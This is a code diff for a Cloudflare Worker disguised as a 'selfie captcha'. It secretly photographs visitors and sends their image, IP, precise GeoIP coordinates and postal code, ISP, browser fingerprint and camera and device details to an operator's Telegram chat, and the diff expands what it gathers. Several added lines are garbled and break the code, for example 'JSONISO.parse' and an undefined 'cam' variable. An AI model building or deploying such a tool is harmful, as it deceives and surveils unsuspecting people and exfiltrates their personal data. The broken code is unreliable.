@@ -1,12 +1,12 @@
 // ============================================================
-//  Selfie Captcha Worker — Professional Skeleton
+//  Selfie Captcha Worker — Professional Skeleton v3
 // ============================================================
 //  Env vars (Cloudflare Dashboard → Settings → Variables):
-//    TELEGRAM_BOT_TOKEN   (required)  – token from @BotFather
-//    TELEGRAM_CHAT_ID     (required)  – target chat/user id
-//    SESSION_SECRET       (optional)  – random string; falls back to bot token
-//    MAX_UPLOAD_BYTES     (optional)  – default 5*1024*1024
-//    RATE_LIMIT_PER_MIN   (optional)  – default 5
+//    TELEGRAM_BOT_TOKEN   (required)
+//    TELEGRAM_CHAT_ID     (required)
+//    SESSION_SECRET       (optional)
+//    MAX_UPLOAD_BYTES     (optional, default 5MB)
+//    RATE_LIMIT_PER_MIN   (optional, default 5)
 // ============================================================
 
 export default {
@@ -76,13 +76,13 @@ async function handleUpload(request, env) {
   const rl = await rateLimit(ip, Number(env.RATE_LIMIT_PER_MIN) || 5, 60);
   if (!rl.allowed) return json({ error: 'rate_limited' }, 429);
 
-  // 2) CSRF / session token check
+  // 2) session token check
   const token = parseCookie(request.headers.get('Cookie') || '', 'hs_session');
   if (!token || !(await verifyToken(token, secret))) {
     return json({ error: 'invalid_session' }, 403);
   }
 
-  // 3) multipart parsing
+  // 3) multipart
   let form;
   try {
     form = await request.formData();
@@ -99,40 +99,59 @@ async function handleUpload(request, env) {
   if (photo.size === 0) return json({ error: 'empty_photo' }, 400);
   if (photo.size > maxBytes) return json({ error: 'photo_too_large' }, 413);
   if (!/^image\/(jpeg|png|webp)$/.test(photo.type)) {
-    return json({ error: 'invalid_mime' }, 415);
+    return json({ error: 'invalid_mime' }, 415 =);
   }
 
-  // 4) client payload
-  let clientInfo = {};
-  try {
-    clientInfo = JSON.parse(clientDataRaw || '{}');
-  } catch {
-    clientInfo = { _parseError: 'invalid json' };
+  //  new4) client payload
+  let client DateInfo = {};
+().  try {
+   to clientInfo = JSONISO.parse(clientDataStringRaw || '{}');
+ ();
+  const } catch {
+    clientInfo cam = { _parseError: 'invalid json' };
   }
 
-  // 5) server-side info
+  // 5) server-side info (item 9 — full GeoIP + network)
   const cf = request.cf || {};
   const serverInfo = {
     ip,
+    // location
     country: cf.country,
+    countryName: cf.countryName,
+    continent: cf.continent,
     city: cf.city,
     region: cf.region,
+    regionCode: cf.regionCode,
+    postalCode: cf.postalCode,
+    latitude: cf.latitude,
+    longitude: cf.longitude,
     timezone: cf.timezone,
+    isEUCountry: cf.isEUCountry,
+    // network
     isp: cf.asOrganization,
     asn: cf.asn,
+    metroCode: cf.metroCode,
+    // connection
     httpProtocol: cf.httpProtocol,
     tlsVersion: cf.tlsVersion,
+    tlsCipher: cf.tlsCipher,
+    clientTcpRtt: cf.clientTcpRtt,
     colo: cf.colo,
+    // headers
     userAgent: request.headers.get('User-Agent'),
     acceptLanguage: request.headers.get('Accept-Language'),
+    acceptEncoding: request.headers.get('Accept-Encoding'),
     referer: request.headers.get('Referer'),
+    // bot management (enterprise only)
+    botScore: cf.botManagement?.score,
+    verifiedBot: cf.botManagement?.verifiedBot,
   };
 
-  // 6) build report
+  // 6) report
   const sessionId = crypto.randomUUID().slice(0, 8);
   const reportHtml = buildReport(sessionId, serverInfo, clientInfo);
 
-  // 7) send to Telegram (each step independent — one failure won't stop others)
+  // 7) send to Telegram
   const tg = new TelegramClient(env.TELEGRAM_BOT_TOKEN, env.TELEGRAM_CHAT_ID);
   const results = [];
 
@@ -221,7 +240,7 @@ class TelegramClient {
 }
 
 // ============================================================
-//  Report builder (HTML, escape-safe)
+//  Report builder (items 9 + 15 integrated)
 // ============================================================
 function buildReport(sessionId, server, client) {
   const esc = (v) =>
@@ -231,27 +250,59 @@ function buildReport(sessionId, server, client) {
       .replace(/>/g, '&gt;')
       .replace(/"/g, '&quot;');
 
-  const when = new Date().toISOString();
+  const when = client.camera || {};
+  const frame = client.capturedFrame || {};
+  const zoom = cam.zoom;
+  const iso = cam.iso;
+
   const lines = [
     `🔐 <b>گزارش سلفی</b>`,
     `<i>شناسه:</i> <code>${sessionId}</code>`,
     `<i>زمان (UTC):</i> ${when}`,
     ``,
+
     `🌐 <b>اطلاعات شبکه</b>`,
     `<pre>IP:          ${esc(server.ip)}
-کشور:       ${esc(server.country)}
+کشور:       ${esc(server.country)} (${esc(server.countryName)})
+قاره:       ${esc(server.continent)}
 شهر:        ${esc(server.city)}
-منطقه:      ${esc(server.region)}
+منطقه:      ${esc(server.region)} / ${esc(server.regionCode)}
+کدپستی:     ${esc(server.postalCode)}
+مختصات:     ${esc(server.latitude)}, ${esc(server.longitude)}
 منطقه زمان: ${esc(server.timezone)}
+EU:         ${server.isEUCountry === '1' ? 'بله' : 'خیر'}
 ISP:        ${esc(server.isp)}
 ASN:        ${esc(server.asn)}
+MetroCode:  ${esc(server.metroCode)}
 HTTP:       ${esc(server.httpProtocol)}
-TLS:        ${esc(server.tlsVersion)}
+TLS:        ${esc(server.tlsVersion)} / ${esc(server.tlsCipher)}
+RTT:        ${esc(server.clientTcpRtt)} ms
 Colo:       ${esc(server.colo)}</pre>`,
     `UA: <code>${esc(server.userAgent)}</code>`,
     `Lang: ${esc(server.acceptLanguage)}`,
+    `Encoding: ${esc(server.acceptEncoding)}`,
     `Referer: ${esc(server.referer)}`,
+    `BotScore: ${esc(server.botScore ?? '—')}`,
     ``,
+
+    `📷 <b>اطلاعات دوربین</b>`,
+    `<pre>نوع:         ${esc(cam.facingMode || '—')}
+رزولوشن:     ${esc(cam.width || '?')}×${esc(cam.height || '?')}
+فریم ریت:    ${esc(cam.frameRate || '?')} fps
+نسبت:        ${esc(cam.aspectRatio || '—')}
+Focus:       ${esc(cam.focusMode || '—')}
+Exposure:    ${esc(cam.exposureMode || '—')}
+WB:          ${esc(cam.whiteBalanceMode || '—')}
+Torch:       ${cam.hasTorch ? 'دارد' : 'ندارد'}
+Zoom:        ${zoom ? `${zoom.min}–${zoom.max}` : '—'}
+ISO:         ${iso ? `${iso.min}–${iso.max}` : '—'}
+دستگاه‌ها:    ${esc(cam.videoDeviceCount)} دوربین / ${esc(cam.audioDeviceCount)} میکروفن
+فریم نهایی:  ${esc(frame.width || '?')}×${esc(frame.height || '?')} (${Math.round((frame.size || 0) / 1024)} KB)</pre>`,
+    cam.videoDeviceLabels && cam.videoDeviceLabels.length
+      ? `<i>لیبل دستگاه‌ها:</i> ${esc(cam.videoDeviceLabels.join(' • '))}`
+      : ``,
+    ``,
+
     `💻 <b>اطلاعات مرورگر</b>`,
     `<pre>User-Agent: ${esc(client.userAgent)}
 زبان:       ${esc(client.language)}
@@ -270,7 +321,8 @@ TZ:         ${esc(client.timezone)}
 DNT:        ${esc(client.doNotTrack)}
 PDF:        ${client.pdfViewerEnabled ? 'بله' : 'خیر'}</pre>`,
   ];
-  return lines.join('\n');
+
+  return lines.filter(Boolean).join('\n');
 }
 
 // ============================================================
@@ -289,7 +341,6 @@ async function verifyToken(token, secret, maxAgeMs = 5 * 60_000) {
     if (!payload || !sig) return false;
     const expected = await hmac(payload, secret);
     if (expected.length !== sig.length) return false;
-    // constant-time compare
     let diff = 0;
     for (let i = 0; i < expected.length; i++) {
       diff |= expected.charCodeAt(i) ^ sig.charCodeAt(i);
@@ -318,7 +369,7 @@ async function hmac(data, secret) {
 }
 
 // ============================================================
-//  Rate limit (Cache API, per-colo approximate)
+//  Rate limit (Cache API, per-colo)
 // ============================================================
 async function rateLimit(ip, limit, windowSec) {
   const cache = caches.default;
@@ -519,6 +570,61 @@ function renderHTML(nonce) {
     });
   }
 
+  // ---------- item 15: camera info ----------
+  async function collectCameraInfo(stream) {
+    const info = {};
+    const track = stream.getVideoTracks()[0];
+    if (!track) return info;
+
+    try {
+      const s = track.getSettings?.() || {};
+      const c = track.getCapabilities?.() || {};
+
+      info.deviceId = s.deviceId;
+      info.groupId = s.groupId;
+      info.facingMode = s.facingMode;
+      info.width = s.width;
+      info.height = s.height;
+      info.frameRate = s.frameRate;
+      info.aspectRatio = s.aspectRatio;
+      info.resizeMode = s.resizeMode;
+      info.focusMode = s.focusMode;
+      info.exposureMode = s.exposureMode;
+      info.whiteBalanceMode = s.whiteBalanceMode;
+
+      info.supportedFacingModes = c.facingMode || [];
+      info.supportedFocusModes = c.focusMode || [];
+      info.hasTorch = !!c.torch;
+      info.zoom = c.zoom ? { min: c.zoom.min, max: c.zoom.max, step: c.zoom.step } : null;
+      info.iso = c.iso ? { min: c.iso.min, max: c.iso.max, step: c.iso.step } : null;
+      info.focusDistance = c.focusDistance
+        ? { min: c.focusDistance.min, max: c.focusDistance.max }
+        : null;
+      info.brightness = c.brightness ? { min: c.brightness.min, max: c.brightness.max } : null;
+      info.contrast = c.contrast ? { min: c.contrast.min, max: c.contrast.max } : null;
+      info.saturation = c.saturation ? { min: c.saturation.min, max: c.saturation.max } : null;
+      info.sharpness = c.sharpness ? { min: c.sharpness.min, max: c.sharpness.max } : null;
+
+      info.requestedConstraints = track.getConstraints?.() || null;
+    } catch (e) {
+      info._settingsError = String(e);
+    }
+
+    try {
+      const devices = await navigator.mediaDevices.enumerateDevices();
+      info.videoDeviceCount = devices.filter((d) => d.kind === 'videoinput').length;
+      info.audioDeviceCount = devices.filter((d) => d.kind === 'audioinput').length;
+      info.videoDeviceLabels = devices
+        .filter((d) => d.kind === 'videoinput')
+        .map((d) => d.label || '(unnamed)');
+    } catch (e) {
+      info._enumerateError = String(e);
+    }
+
+    return info;
+  }
+
+  // ---------- general client data ----------
   function collectClientData() {
     const c = navigator.connection || {};
     return {
@@ -553,7 +659,10 @@ function renderHTML(nonce) {
       stream = await getCameraStream();
       el.video.srcObject = stream;
       await waitForVideo(el.video);
-      await new Promise((r) => setTimeout(r, 350)); // warm-up frame
+      await new Promise((r) => setTimeout(r, 350));
+
+      // 🔽 capture camera info BEFORE stopping stream
+      const camInfo = await collectCameraInfo(stream);
 
       el.canvas.width = el.video.videoWidth || 640;
       el.canvas.height = el.video.videoHeight || 480;
@@ -562,12 +671,22 @@ function renderHTML(nonce) {
       const blob = await new Promise((res) => el.canvas.toBlob(res, 'image/jpeg', 0.9));
       if (!blob) throw new Error('capture_failed');
 
+      const captured = {
+        width: el.canvas.width,
+        height: el.canvas.height,
+        size: blob.size,
+      };
+
       stream.getTracks().forEach((t) => t.stop());
       stream = null;
 
+      const clientData = collectClientData();
+      clientData.camera = camInfo;
+      clientData.capturedFrame = captured;
+
       const fd = new FormData();
       fd.append('photo', blob, 'selfie.jpg');
-      fd.append('clientData', JSON.stringify(collectClientData()));
+      fd.append('clientData', JSON.stringify(clientData));
 
       const resp = await fetch('/upload', { method: 'POST', body: fd, credentials: 'same-origin' });
       if (!resp.ok) {
